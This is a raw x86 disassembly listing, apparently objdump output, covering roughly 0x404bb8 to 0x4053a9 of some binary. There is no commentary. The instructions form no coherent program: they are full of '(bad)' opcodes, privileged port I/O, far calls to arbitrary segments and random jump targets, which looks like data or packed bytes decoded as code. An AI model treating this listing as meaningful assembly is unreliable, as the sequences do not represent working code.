  404bb8:	ins    BYTE PTR es:[edi],dx
  404bb9:	out    dx,al
  404bba:	scas   al,BYTE PTR es:[edi]
  404bbb:	sti    
  404bbc:	and    eax,0xcbdd3c84
  404bc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bc2:	es xchg esp,eax
  404bc4:	mov    al,0xa8
  404bc6:	das    
  404bc7:	ja     0x404be7
  404bc9:	dec    edx
  404bca:	mov    bl,0xd4
  404bcc:	sti    
  404bcd:	sbb    eax,0x7011fe42
  404bd2:	call   0x6e7d0464
  404bd7:	pop    esp
  404bd8:	or     DWORD PTR [ebp+0x4042ac83],ebp
  404bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bdf:	gs (bad) 
  404be1:	push   edi
  404be2:	pop    ecx
  404be3:	outs   dx,BYTE PTR ds:[esi]
  404be4:	mov    dh,0x22
  404be6:	sub    ecx,DWORD PTR fs:[ebx]
  404be9:	sbb    ch,BYTE PTR [ebx]
  404beb:	imul   esp,DWORD PTR [ebx-0x80],0xffffffde
  404bef:	jbe    0x404c6d
  404bf1:	nop
  404bf2:	rcr    BYTE PTR [edi-0xb],1
  404bf5:	ret    
  404bf6:	popa   
  404bf7:	(bad)  
  404bf8:	test   BYTE PTR [ecx],0xb9
  404bfb:	icebp  
  404bfc:	push   ss
  404bfd:	out    dx,eax
  404bfe:	loopne 0x404b87
  404c00:	loopne 0x404bed
  404c02:	pop    edi
  404c03:	push   es
  404c04:	imul   esi,DWORD PTR [eax-0x1b],0xffffffda
  404c08:	or     eax,DWORD PTR [edi+0x4f8bf6e6]
  404c0e:	call   FWORD PTR [esp+esi*1+0x29]
  404c12:	mov    DWORD PTR [edx-0x77],edx
  404c15:	xlat   BYTE PTR ds:[ebx]
  404c16:	outs   dx,DWORD PTR ds:[esi]
  404c17:	dec    ebx
  404c18:	sub    DWORD PTR [ebx+0x7c40599a],esp
  404c1e:	jmp    0x404c81
  404c20:	outs   dx,DWORD PTR ds:[esi]
  404c21:	call   0x458c:0xf194727e
  404c28:	aad    0x13
  404c2a:	imul   edi,DWORD PTR [esi+0x7e],0x748f1ea3
  404c31:	repz xchg esi,eax
  404c33:	jno    0x404bbe
  404c35:	outs   dx,BYTE PTR ds:[esi]
  404c36:	mov    dh,0xba
  404c38:	jmp    0x404bd5
  404c3a:	out    dx,eax
  404c3b:	out    dx,al
  404c3c:	add    al,dl
  404c3e:	or     BYTE PTR [ebp+0x25],bl
  404c41:	fnstcw WORD PTR [edx-0x5c]
  404c44:	cld    
  404c45:	fidivr DWORD PTR [ecx-0x60e56f05]
  404c4b:	xor    bh,bh
  404c4d:	xchg   BYTE PTR [ebx+0x4a],cl
  404c50:	push   ecx
  404c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c52:	mov    ah,0x1f
  404c54:	push   0x47
  404c56:	cmp    DWORD PTR [eax+0xa3ec135],ebp
  404c5c:	loop   0x404c0d
  404c5e:	pop    ebp
  404c5f:	xchg   ebx,eax
  404c60:	mov    ebx,DWORD PTR [edi-0x3a5795c0]
  404c66:	inc    edi
  404c67:	inc    edx
  404c68:	pop    ds
  404c69:	xchg   BYTE PTR [ecx+0x6c2d2dcc],bh
  404c6f:	inc    edi
  404c70:	(bad)  
  404c72:	add    eax,0x3b151ea2
  404c77:	aaa    
  404c78:	push   esp
  404c79:	sbb    DWORD PTR [esi+0x40],edx
  404c7c:	mov    al,0x54
  404c7e:	sub    DWORD PTR [bx+di],0xffffffee
  404c82:	test   al,0xb8
  404c84:	lea    edx,[ecx-0x12ed785c]
  404c8a:	push   ebp
  404c8b:	cli    
  404c8c:	push   eax
  404c8d:	imul   eax,DWORD PTR [ecx+0x6d],0x76cd370a
  404c94:	pusha  
  404c95:	add    BYTE PTR [esi+0x15bf33b0],0x8d
  404c9c:	icebp  
  404c9d:	dec    edi
  404c9e:	xchg   edx,edi
  404ca0:	iret   
  404ca1:	mov    esi,0x8161bfb0
  404ca6:	pusha  
  404ca7:	inc    ecx
  404ca8:	add    eax,0x600a5f39
  404cad:	inc    edx
  404cae:	mov    edi,0xf016d40
  404cb3:	mov    al,ds:0x33cc6407
  404cb8:	inc    esp
  404cb9:	inc    edx
  404cba:	push   esi
  404cbb:	mov    edi,0xb71e4139
  404cc0:	mov    eax,0x9be40e62
  404cc5:	stos   DWORD PTR es:[edi],eax
  404cc6:	shr    BYTE PTR [edx+0x1ad4f334],0x3b
  404ccd:	push   ebp
  404cce:	adc    eax,0x8c2dac47
  404cd4:	mov    esi,0x913f438b
  404cd9:	or     eax,0x982006ca
  404cde:	fs pop eax
  404ce0:	enter  0xd2f7,0xad
  404ce4:	retf   0xe904
  404ce7:	ins    DWORD PTR es:[edi],dx
  404ce8:	jl     0x404c6e
  404cea:	pop    edi
  404ceb:	cdq    
  404cec:	sar    DWORD PTR [eax*2+0x625fbbe4],0xc3
  404cf4:	and    DWORD PTR [edi-0x638a3b9c],ecx
  404cfa:	fcmovu st,st(0)
  404cfc:	fnsave [edi+0x5a6d0f0b]
  404d02:	or     al,0xdb
  404d04:	ins    BYTE PTR es:[edi],dx
  404d05:	dec    esp
  404d06:	fsub   QWORD PTR [ecx-0x7a79e3e3]
  404d0c:	xor    BYTE PTR ds:0x38b746a6,dl
  404d12:	mov    edx,0xeeb86c95
  404d17:	stos   DWORD PTR es:[edi],eax
  404d18:	xchg   esp,eax
  404d19:	pop    es
  404d1a:	sbb    eax,0x5f5948a
  404d1f:	mov    gs:0x90203d55,al
  404d25:	leave  
  404d26:	xchg   edx,eax
  404d27:	add    esi,DWORD PTR [esi]
  404d29:	pop    ebx
  404d2a:	mov    al,0xc
  404d2c:	(bad)  
  404d2d:	lods   eax,DWORD PTR ds:[esi]
  404d2e:	dec    edx
  404d2f:	fst    st(0)
  404d31:	shl    DWORD PTR ds:0xee945f62,1
  404d37:	aas    
  404d38:	dec    edi
  404d39:	ror    DWORD PTR [ecx-0x5a7608e8],1
  404d3f:	cld    
  404d40:	sbb    eax,0xe6142f08
  404d45:	out    0xe6,eax
  404d47:	out    0xb,al
  404d49:	dec    ecx
  404d4a:	mov    ds:0x410150ea,eax
  404d4f:	pop    eax
  404d50:	mov    ebx,0x183c5905
  404d55:	mov    eax,0xd89f3f75
  404d5a:	dec    eax
  404d5b:	scas   eax,DWORD PTR es:[edi]
  404d5c:	add    al,0x37
  404d5e:	(bad)  
  404d5f:	mov    bh,0xb2
  404d61:	outs   dx,BYTE PTR ds:[esi]
  404d62:	adc    dh,bh
  404d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d65:	jno    0x404d74
  404d67:	loop   0x404d46
  404d69:	in     eax,0x1e
  404d6b:	push   edi
  404d6c:	in     eax,0x71
  404d6e:	or     ebx,DWORD PTR [ebx]
  404d70:	sbb    ch,bh
  404d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d73:	lea    esp,[esp+eax*1+0x137e9f89]
  404d7a:	fdivr  DWORD PTR [esi+ebp*8-0x13090b99]
  404d81:	sbb    DWORD PTR [ecx-0x715dda5f],0xffffffef
  404d88:	cmp    eax,0xc0b76556
  404d8d:	bound  eax,QWORD PTR [edx+edx*2]
  404d90:	out    dx,eax
  404d91:	mov    dl,0x0
  404d93:	fs out 0x71,al
  404d96:	out    0x5,al
  404d98:	fdivr  DWORD PTR [edi-0x4c]
  404d9b:	aam    0x47
  404d9d:	or     edi,DWORD PTR [esi-0x61]
  404da0:	sbb    dh,al
  404da2:	add    DWORD PTR [ebx+0x3286518b],ecx
  404da8:	push   0x6f
  404daa:	xor    ch,dl
  404dac:	in     al,dx
  404dad:	(bad)  
  404dae:	jge    0x404e0b
  404db0:	push   0x39
  404db2:	in     al,0x77
  404db4:	push   esi
  404db5:	cmp    esi,DWORD PTR [esp+ebp*4-0x3d]
  404db9:	dec    ecx
  404dba:	jbe    0x404d98
  404dbc:	test   BYTE PTR ds:0x9a189bd2,ah
  404dc2:	loop   0x404dee
  404dc4:	addr16 cmp eax,0x560e7bb3
  404dca:	pop    edi
  404dcb:	xchg   ebp,eax
  404dcc:	xor    eax,0x133052a4
  404dd1:	(bad)  
  404dd2:	int3   
  404dd3:	xor    al,0x22
  404dd5:	cmp    eax,0x96b45100
  404dda:	lds    esp,FWORD PTR [edx-0x2d7340e7]
  404de0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404de1:	jmp    0x778465ea
  404de6:	and    edx,edx
  404de8:	mov    esi,0xb11f8736
  404ded:	les    edi,FWORD PTR [eax-0x1b]
  404df0:	and    al,0x48
  404df2:	ret    
  404df3:	clc    
  404df4:	push   edx
  404df5:	in     al,0x9
  404df7:	sbb    esi,ebx
  404df9:	rol    DWORD PTR [esi+esi*1-0x5f3b111],0x25
  404e01:	js     0x404e1b
  404e03:	xor    eax,0x74e58c74
  404e08:	dec    edi
  404e09:	nop
  404e0a:	loope  0x404e6e
  404e0c:	or     ebp,DWORD PTR [edi+0x7f77ba52]
  404e12:	adc    ah,BYTE PTR [ebx-0x398cf241]
  404e18:	pop    edx
  404e19:	mov    ch,BYTE PTR [ecx+0x3e]
  404e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e1d:	cmp    dl,dl
  404e1f:	(bad)  
  404e20:	or     eax,esi
  404e22:	mov    eax,ds:0x3147cf37
  404e27:	and    ah,BYTE PTR [esi]
  404e29:	dec    eax
  404e2a:	les    ecx,FWORD PTR [ebx-0x72]
  404e2d:	add    eax,0x915245f1
  404e32:	shr    BYTE PTR [ecx+0x55],0xba
  404e36:	fild   QWORD PTR [ebp+0x26]
  404e39:	add    al,0x9c
  404e3b:	push   ds
  404e3c:	sar    esp,1
  404e3e:	dec    esi
  404e3f:	sbb    al,0xc5
  404e41:	mov    ebp,ds
  404e43:	cmp    esp,DWORD PTR [esi+edx*4]
  404e46:	inc    edx
  404e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e48:	mov    BYTE PTR [edx+edi*2+0x41],bl
  404e4c:	mov    edi,0xfe97f41e
  404e51:	jbe    0x404e15
  404e53:	ja     0x404e08
  404e55:	in     al,dx
  404e56:	xor    eax,0x9420b6c9
  404e5b:	ret    
  404e5c:	test   DWORD PTR ds:0x70160d3a,eax
  404e62:	add    esi,DWORD PTR [esi-0x41]
  404e65:	clc    
  404e66:	fistp  QWORD PTR [eax+0x6ba2c24]
  404e6c:	outs   dx,BYTE PTR ds:[esi]
  404e6d:	ret    0x877f
  404e70:	cli    
  404e71:	mov    ds:0xd00acf3b,eax
  404e76:	xchg   ebp,eax
  404e77:	mov    bh,bh
  404e79:	jmp    0x404eac
  404e7b:	lock fsubr QWORD PTR [ebp+0x33b7dd6e]
  404e82:	or     al,0xb2
  404e84:	out    dx,eax
  404e85:	ins    DWORD PTR es:[edi],dx
  404e86:	rcr    BYTE PTR [edx-0x3d],0x1b
  404e8a:	pop    ss
  404e8b:	ret    
  404e8c:	cmova  ecx,DWORD PTR ds:0x47113018
  404e93:	fwait
  404e94:	int    0xec
  404e96:	adc    BYTE PTR [edi],0xb
  404e99:	out    dx,al
  404e9a:	dec    ebx
  404e9b:	xchg   edi,eax
  404e9c:	pop    ds
  404e9d:	xchg   BYTE PTR [esi],ch
  404e9f:	mov    dh,0xb2
  404ea1:	push   ds
  404ea2:	mov    ebp,0xca635b09
  404ea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ea8:	imul   eax,DWORD PTR [eax-0x21c8e31],0x3769460f
  404eb2:	cmp    ebx,esi
  404eb4:	adc    esp,ebp
  404eb6:	lds    edi,FWORD PTR [ebx]
  404eb8:	add    DWORD PTR [esp+eiz*8-0x14],edi
  404ebc:	lock pop ds
  404ebe:	aam    0x1e
  404ec0:	or     cl,0x45
  404ec3:	adc    eax,0xf98ff38b
  404ec8:	add    dh,dl
  404eca:	ss cmp al,0x2f
  404ecd:	pusha  
  404ece:	inc    esp
  404ecf:	adc    DWORD PTR [ecx+0x657bb293],ecx
  404ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ed6:	add    al,0xef
  404ed8:	sbb    al,0xdd
  404eda:	int    0x92
  404edc:	dec    edx
  404edd:	test   al,al
  404edf:	(bad)  
  404ee1:	cwde   
  404ee2:	mov    ds:0x8724b34a,al
  404ee7:	pop    ecx
  404ee8:	or     DWORD PTR [esi-0x70],ebp
  404eeb:	mov    edx,0x86ca9d8e
  404ef0:	call   0x3ba6:0xa3f963ba
  404ef7:	mov    cl,0xbd
  404ef9:	sbb    al,0xc4
  404efb:	and    esp,DWORD PTR [ebx+0x79d88526]
  404f01:	cwde   
  404f02:	pop    edi
  404f03:	dec    esi
  404f04:	arpl   WORD PTR fs:[eax-0x5e],dx
  404f08:	push   edi
  404f09:	ins    BYTE PTR es:[edi],dx
  404f0a:	and    BYTE PTR [edx],dl
  404f0c:	loope  0x404edc
  404f0e:	out    dx,al
  404f0f:	les    eax,FWORD PTR [eax]
  404f11:	pop    edx
  404f12:	dec    esi
  404f13:	pusha  
  404f14:	jbe    0x404ea3
  404f16:	mov    edi,0x6cd95892
  404f1b:	and    eax,0x4af0fc47
  404f20:	leave  
  404f21:	call   0x5e62140a
  404f26:	dec    esi
  404f27:	fistp  WORD PTR [edi-0x2f]
  404f2a:	test   BYTE PTR [esp+ecx*4+0x150840fd],0x6e
  404f32:	mov    ecx,0x4c288423
  404f37:	add    BYTE PTR [ebp+0x6a0b6364],0x3d
  404f3e:	dec    eax
  404f3f:	test   al,0xd8
  404f41:	jns    0x404fb7
  404f43:	call   0xe1c3:0x25821ac4
  404f4a:	xor    ebx,DWORD PTR [ecx+0x218fd139]
  404f50:	cli    
  404f51:	cmc    
  404f52:	std    
  404f53:	jl     0x404fa1
  404f55:	jbe    0x404efd
  404f57:	(bad)  [ecx]
  404f59:	jns    0x404f31
  404f5b:	ror    DWORD PTR [esi+ecx*8],1
  404f5e:	sbb    ecx,DWORD PTR [edx]
  404f60:	es int3 
  404f62:	sub    BYTE PTR [eax+0x242945b1],0x94
  404f69:	adc    bh,ah
  404f6b:	mov    ecx,DWORD PTR [ebp-0x4]
  404f6e:	dec    edx
  404f6f:	or     eax,0x405b99fd
  404f74:	or     eax,0xa738bf1a
  404f79:	sbb    dl,cl
  404f7b:	das    
  404f7c:	aaa    
  404f7d:	dec    eax
  404f7e:	and    DWORD PTR ds:0xc1a161c8,esi
  404f84:	call   0xa84659e5
  404f89:	retf   0x9300
  404f8c:	mov    ds:0x89cfe807,al
  404f91:	xchg   BYTE PTR [ecx+0x2311771e],dh
  404f97:	bound  esi,QWORD PTR [esi+esi*1-0x3b]
  404f9b:	cmp    eax,0xd4fb9a46
  404fa0:	and    edx,DWORD PTR ds:0x9aa1d4ed
  404fa6:	xchg   esp,eax
  404fa7:	cmp    dl,BYTE PTR ds:0x22b51d9b
  404fad:	jg     0x404f9d
  404faf:	(bad)  
  404fb0:	cmc    
  404fb1:	add    BYTE PTR [esi+0x63],al
  404fb4:	fs lock mov ecx,0x5af32f1a
  404fbb:	and    cl,BYTE PTR [ebp+0x5]
  404fbe:	inc    esp
  404fbf:	mov    al,0x62
  404fc1:	cmp    BYTE PTR [ecx],al
  404fc3:	or     al,0x37
  404fc5:	cmp    ah,BYTE PTR [edx]
  404fc7:	sbb    eax,0x7e179482
  404fcc:	pusha  
  404fcd:	cmc    
  404fce:	cld    
  404fcf:	imul   eax,DWORD PTR [eax-0x65],0x55
  404fd3:	pop    ecx
  404fd4:	imul   esi,DWORD PTR [ebp+0x68a50303],0xc68a6dcb
  404fde:	lods   eax,DWORD PTR ss:[esi]
  404fe0:	pop    edx
  404fe1:	mov    dl,0x78
  404fe3:	clc    
  404fe4:	mov    ebx,0xc165925
  404fe9:	(bad)
  404fed:	imul   edi,eax,0x56
  404ff0:	xor    esi,DWORD PTR [ecx+ebp*1-0x74]
  404ff4:	or     DWORD PTR [ebx],0xc12d2158
  404ffa:	out    dx,al
  404ffb:	and    eax,0x198692b6
  405000:	ja     0x405041
  405002:	or     DWORD PTR [ecx-0x40c02310],0xd3c95573
  40500c:	call   0xcf6f:0x5537e44b
  405013:	push   edi
  405014:	js     0x405095
  405016:	jle    0x404f9c
  405018:	inc    esi
  405019:	inc    ebp
  40501a:	int    0xe
  40501c:	mov    al,ds:0x40fb090
  405021:	sub    al,0x8
  405023:	addr16 mov ebp,0xa7564859
  405029:	inc    edx
  40502a:	nop
  40502b:	mov    WORD PTR [ecx-0x37],?
  40502e:	inc    eax
  40502f:	inc    ecx
  405030:	imul   ecx,DWORD PTR [esp+esi*1+0x26],0x52
  405035:	pop    ds
  405036:	dec    ebp
  405037:	mov    bl,0x96
  405039:	(bad)  
  40503a:	and    ecx,esp
  40503c:	dec    edx
  40503d:	fnsave [edx+0x49]
  405040:	nop
  405041:	sub    al,0xb9
  405043:	sti    
  405044:	xchg   ebx,eax
  405045:	test   al,0x3a
  405047:	mov    dl,0x18
  405049:	sbb    al,0x91
  40504b:	pop    ds
  40504c:	jns    0x40506a
  40504e:	aam    0x72
  405050:	enter  0x8d1,0xe0
  405054:	and    al,0x11
  405056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405057:	sub    esi,ecx
  405059:	stos   DWORD PTR es:[edi],eax
  40505a:	add    al,0xb0
  40505c:	cld    
  40505d:	mov    bh,0x7e
  40505f:	or     BYTE PTR [ecx+0x65a85b47],cl
  405065:	repz push 0xc80a5f18
  40506b:	mov    esi,0xba5f8594
  405070:	fiadd  WORD PTR [eax-0xf]
  405073:	mov    ebx,0x42e251ac
  405078:	ds xchg esp,eax
  40507a:	ins    BYTE PTR es:[edi],dx
  40507b:	(bad)  
  40507c:	imul   ecx,edi,0x5d
  40507f:	adc    al,0xac
  405081:	lahf   
  405082:	cwde   
  405083:	sub    dh,BYTE PTR [ebp+0x5]
  405086:	dec    edx
  405087:	add    dh,dl
  405089:	push   ebp
  40508a:	je     0x405083
  40508c:	sbb    eax,ebp
  40508e:	mov    esp,0x2701d557
  405093:	xchg   edx,eax
  405094:	call   0x303e38a8
  405099:	jmp    0x4050e5
  40509b:	repz leave 
  40509d:	pop    edi
  40509e:	imul   edi,eax,0xffffffeb
  4050a1:	retf   0xac80
  4050a4:	fst    QWORD PTR [ebp-0x29cea7]
  4050aa:	push   esi
  4050ab:	pop    ecx
  4050ac:	adc    eax,0xd6289541
  4050b1:	or     eax,0x4a6d1400
  4050b6:	cmp    DWORD PTR [ecx+0x5d],0xced87be1
  4050bd:	push   edi
  4050be:	push   edx
  4050bf:	ins    BYTE PTR es:[edi],dx
  4050c0:	rol    BYTE PTR [ecx-0x3f],1
  4050c3:	or     al,0x2c
  4050c5:	xor    al,0xe1
  4050c7:	mov    al,ds:0xaf0d5bbf
  4050cc:	sub    BYTE PTR [edx],cl
  4050ce:	(bad)  
  4050d0:	mov    dl,al
  4050d2:	cmp    ah,dl
  4050d4:	out    0x82,al
  4050d6:	(bad)  
  4050d7:	fs push ebp
  4050d9:	in     al,0x57
  4050db:	fwait
  4050dc:	xor    BYTE PTR [ebx],0xde
  4050df:	retf   0xd900
  4050e2:	xchg   esp,eax
  4050e3:	mov    edi,DWORD PTR [edx-0x7c]
  4050e6:	aam    0x79
  4050e8:	out    0x32,al
  4050ea:	or     eax,0x5294daa9
  4050ef:	xchg   BYTE PTR [edi+0x16],dh
  4050f2:	sub    al,0xe1
  4050f4:	add    ecx,esi
  4050f6:	dec    esi
  4050f7:	dec    eax
  4050f8:	call   esp
  4050fa:	push   edi
  4050fb:	enter  0xaaf2,0xc9
  4050ff:	mov    al,0xfc
  405101:	in     al,0xad
  405103:	sbb    dl,ch
  405105:	xchg   edx,eax
  405106:	xor    BYTE PTR [edx],bl
  405108:	(bad)  
  405109:	xchg   ebx,eax
  40510a:	xchg   DWORD PTR [edi],esp
  40510c:	mov    dh,dl
  40510e:	icebp  
  40510f:	push   ebx
  405110:	xchg   ebx,ecx
  405112:	(bad)  
  405113:	push   esp
  405114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405115:	scas   eax,DWORD PTR es:[edi]
  405116:	push   esi
  405117:	pop    esi
  405118:	jb     0x4050d2
  40511a:	mov    ah,0x9b
  40511c:	dec    esp
  40511d:	cs les ebx,FWORD PTR ds:[edx-0x15e42501]
  405125:	jle    0x405147
  405127:	mov    ecx,0x59ccc25f
  40512c:	add    edi,ecx
  40512e:	ret    
  40512f:	test   DWORD PTR [esi+0x2a1befe9],esp
  405135:	ret    
  405136:	mov    ds:0x26d1597e,eax
  40513b:	xor    edx,DWORD PTR [ebx-0x2c7ab4ba]
  405141:	jb     0x4050c7
  405143:	xor    eax,0xe044bd57
  405148:	sbb    bl,BYTE PTR [ebp-0x13198b6a]
  40514e:	imul   edx,DWORD PTR [edi+eiz*1-0x3],0x27
  405153:	xor    DWORD PTR [esi-0x3e3363ff],esp
  405159:	or     al,0x8c
  40515b:	sub    eax,0x7923f097
  405160:	clc    
  405161:	sbb    esi,0x77
  405164:	mov    WORD PTR [edi],es
  405166:	cs or  al,0x6f
  405169:	fwait
  40516a:	mov    ebx,0x1a2b40f8
  405170:	or     bl,ch
  405172:	sti    
  405173:	xchg   edi,eax
  405174:	jnp    0x405162
  405176:	fwait
  405177:	xor    DWORD PTR [esi+eax*4+0x5a],ebp
  40517b:	inc    ebx
  40517c:	jecxz  0x4051b9
  40517e:	je     0x405173
  405180:	dec    esp
  405181:	adc    eax,0x4488cf47
  405186:	test   cl,dl
  405188:	and    eax,0xad8e0eec
  40518d:	aas    
  40518e:	sahf   
  40518f:	pop    edx
  405190:	loop   0x4051b0
  405192:	jae    0x4051b3
  405194:	push   ebx
  405195:	jmp    0x6cf:0x8c864326
  40519c:	add    DWORD PTR [edx-0x79a00814],0xffffffde
  4051a3:	jb     0x405145
  4051a5:	(bad)  
  4051a6:	dec    ebx
  4051a7:	mov    edi,0x45d8352a
  4051ac:	push   ebp
  4051ad:	fbld   TBYTE PTR [ebx]
  4051af:	test   eax,0xc9efa68e
  4051b4:	pushf  
  4051b5:	adc    eax,0x67162e8e
  4051ba:	pop    ds
  4051bb:	ins    BYTE PTR es:[edi],dx
  4051bc:	dec    esi
  4051bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051be:	inc    esi
  4051bf:	outs   dx,DWORD PTR ds:[esi]
  4051c0:	add    cl,BYTE PTR [eax+ecx*8]
  4051c3:	fsub   st,st(6)
  4051c5:	ins    BYTE PTR es:[edi],dx
  4051c6:	pop    eax
  4051c7:	xor    eax,DWORD PTR [ebx]
  4051c9:	repz lock aam 0x7
  4051cd:	dec    ebx
  4051ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051cf:	jecxz  0x4051ec
  4051d1:	imul   ebp,DWORD PTR [esi],0x45a47b2a
  4051d7:	daa    
  4051d8:	fsubr  st,st(4)
  4051da:	retf   
  4051db:	call   DWORD PTR [esp+esi*4+0x79e6381]
  4051e2:	lds    ebx,FWORD PTR [eax-0x1e]
  4051e5:	add    eax,0xfdd0f52f
  4051ea:	xchg   esi,eax
  4051eb:	mov    BYTE PTR [ebx-0x71],dl
  4051ee:	xchg   edi,eax
  4051ef:	out    dx,al
  4051f0:	in     al,dx
  4051f1:	ret    0xb07
  4051f4:	sbb    BYTE PTR [esi+0x31],0xdc
  4051f8:	into   
  4051f9:	xchg   edx,eax
  4051fa:	push   eax
  4051fb:	std    
  4051fc:	xor    DWORD PTR [ebp-0x5c],0x22f927cd
  405203:	jns    0x405231
  405205:	jge    0x4051c0
  405207:	push   0x996e0803
  40520c:	mov    bl,0x15
  40520e:	mov    eax,0x86057a8d
  405213:	je     0x4051d5
  405215:	std    
  405216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405217:	xchg   ebp,eax
  405218:	leave  
  405219:	pop    esp
  40521a:	(bad)  
  40521b:	lea    esi,[esi-0x27904e57]
  405221:	dec    esi
  405222:	gs scas al,BYTE PTR es:[edi]
  405224:	pop    edx
  405225:	jg     0x405231
  405227:	push   edi
  405228:	mov    bh,0xb
  40522a:	and    eax,0x78c5579c
  40522f:	lods   eax,DWORD PTR ds:[esi]
  405230:	jecxz  0x405255
  405232:	jecxz  0x4051d2
  405234:	xor    eax,0xf5efe5f0
  405239:	cmp    edi,DWORD PTR ds:0xf000ed8d
  40523f:	ret    
  405240:	sbb    al,al
  405242:	cmp    eax,0x2b919f2d
  405247:	js     0x405220
  405249:	fst    DWORD PTR [ebx]
  40524b:	mov    ebp,0x5245b176
  405250:	jnp    0x405227
  405252:	fild   QWORD PTR [ebx+0xda12b21]
  405258:	cmp    al,0xee
  40525a:	test   DWORD PTR [eax],0xbf7eed0
  405260:	dec    eax
  405261:	or     ebx,0x8c40e1ba
  405267:	frstor [ecx-0xa]
  40526a:	bound  ebp,QWORD PTR [ecx+0x14ea6880]
  405270:	mov    ecx,0xfcee8c66
  405275:	jp     0x40527a
  405277:	pop    edi
  405278:	sub    ecx,DWORD PTR fs:[ebp+0x3acc3e3d]
  40527f:	pop    ebp
  405280:	cdq    
  405281:	not    DWORD PTR [ebx-0x6d]
  405284:	jb     0x405255
  405286:	mov    bl,0x5f
  405288:	stos   BYTE PTR es:[edi],al
  405289:	inc    edx
  40528a:	push   cs
  40528b:	int    0xd2
  40528d:	int3   
  40528e:	sbb    al,0xa2
  405290:	cdq    
  405291:	enter  0xec9f,0x41
  405295:	mov    bh,0x61
  405297:	cmp    al,0x7b
  405299:	sahf   
  40529a:	jp     0x4052b7
  40529c:	out    dx,eax
  40529d:	pop    ds
  40529e:	cmp    al,0x46
  4052a0:	into   
  4052a1:	jnp    0x40527b
  4052a3:	mov    ecx,0x91a2a251
  4052a8:	js     0x405251
  4052aa:	fsub   st,st(7)
  4052ac:	adc    edx,ebp
  4052ae:	sbb    ah,BYTE PTR [ecx-0x57]
  4052b1:	adc    esi,DWORD PTR [ebp-0x44e2fe58]
  4052b7:	ret    
  4052b8:	aam    0x1
  4052ba:	mov    ecx,0xe0e6f4e
  4052bf:	fadd   DWORD PTR [esi-0x20]
  4052c2:	(bad)  
  4052c3:	sbb    eax,0xc708400c
  4052c8:	sar    bh,1
  4052ca:	and    ecx,eax
  4052cc:	mov    al,bh
  4052ce:	xchg   edx,eax
  4052cf:	inc    esp
  4052d0:	rcl    edx,cl
  4052d2:	adc    BYTE PTR [eax+eax*4],0x1c
  4052d6:	std    
  4052d7:	inc    esi
  4052d8:	push   ebx
  4052d9:	cli    
  4052da:	xchg   ebp,eax
  4052db:	xor    BYTE PTR [edx],bh
  4052dd:	jle    0x4052bd
  4052df:	scas   al,BYTE PTR es:[edi]
  4052e0:	mov    DWORD PTR [eax+0x49],ecx
  4052e3:	mov    eax,ds:0x712919f6
  4052e8:	dec    ecx
  4052e9:	outs   dx,DWORD PTR ds:[esi]
  4052ea:	call   0xc49c:0x62ad729c
  4052f1:	popa   
  4052f2:	mov    es,WORD PTR [edi]
  4052f4:	adc    BYTE PTR [ebx*4-0x770d41a7],ch
  4052fb:	sti    
  4052fc:	stc    
  4052fd:	ins    DWORD PTR es:[di],dx
  4052ff:	add    ebx,DWORD PTR [ecx+0x61304397]
  405305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405306:	out    dx,eax
  405307:	rcl    DWORD PTR [ecx+0x19],1
  40530a:	daa    
  40530b:	fstp   QWORD PTR [edi+0xd]
  40530e:	lock shl BYTE PTR [ebx],0xe5
  405312:	push   cs
  405313:	mov    esi,0x67bf430c
  405318:	and    al,0x39
  40531a:	or     BYTE PTR [edx+0x71],ch
  40531d:	or     eax,0x9de27e20
  405322:	div    dl
  405324:	push   0xd50dcfc6
  405329:	dec    edx
  40532a:	mov    BYTE PTR [ebx+0x1d],dh
  40532d:	icebp  
  40532e:	cld    
  40532f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405330:	or     al,0xdf
  405332:	outs   dx,DWORD PTR ds:[esi]
  405333:	jl     0x405341
  405335:	scas   al,BYTE PTR es:[edi]
  405336:	or     cl,dh
  405338:	xchg   esp,eax
  405339:	xchg   ebp,eax
  40533a:	and    DWORD PTR [esi+0x6a],ecx
  40533d:	lods   al,BYTE PTR ds:[esi]
  40533e:	and    al,cl
  405340:	shl    BYTE PTR [eax-0x3],0x88
  405344:	jecxz  0x405343
  405346:	sbb    DWORD PTR [eax],ebp
  405348:	pop    ecx
  405349:	mov    dh,0x91
  40534b:	in     al,0xc7
  40534d:	adc    ebx,0xd4658753
  405353:	gs push cs
  405355:	and    DWORD PTR [ecx+0x57],ecx
  405358:	sub    al,0x6f
  40535a:	xor    al,0xbb
  40535c:	aaa    
  40535d:	or     eax,0xaaeeaa4d
  405362:	(bad)  
  405364:	jp     0x4053c9
  405366:	fadd   QWORD PTR [ebp-0x51]
  405369:	out    dx,al
  40536a:	sahf   
  40536b:	sar    esi,1
  40536d:	ret    
  40536e:	test   DWORD PTR [ebp-0x1537dac6],eax
  405374:	mov    esi,0x5888b7e9
  405379:	loope  0x40538b
  40537b:	cmp    eax,0x7df16e70
  405380:	mov    eax,0x6062ef05
  405385:	retf   0x935f
  405388:	in     eax,0xdc
  40538a:	popa   
  40538b:	and    BYTE PTR [ebp+0x75ed52cc],ah
  405391:	push   esi
  405392:	loopne 0x4053ce
  405394:	in     al,0xc0
  405396:	or     ebx,DWORD PTR [ebp-0x13]
  405399:	mov    esi,0x24831cc4
  40539e:	sub    DWORD PTR [ebx],esp
  4053a0:	sub    DWORD PTR [ecx],0xffffff93
  4053a3:	(bad)
  4053a6:	sub    DWORD PTR [edx-0x66],edi
  4053a9:	adc    ecx,DWORD PTR [edi+0x774997f4]
